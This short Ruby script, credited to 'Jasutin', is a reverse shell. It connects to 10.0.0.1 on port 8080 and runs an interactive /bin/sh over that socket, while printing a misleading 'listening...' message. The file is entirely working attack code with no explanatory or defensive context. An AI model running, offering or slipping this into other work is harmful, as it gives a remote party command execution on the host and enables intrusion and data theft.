#!/bin/ruby
## Powered by Jasutin
## Use -rsocket to include TCP Socket

print("listening...")

f = TCPSocket.open("10.0.0.1", 8080).to_i;
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f, f, f)

exit;
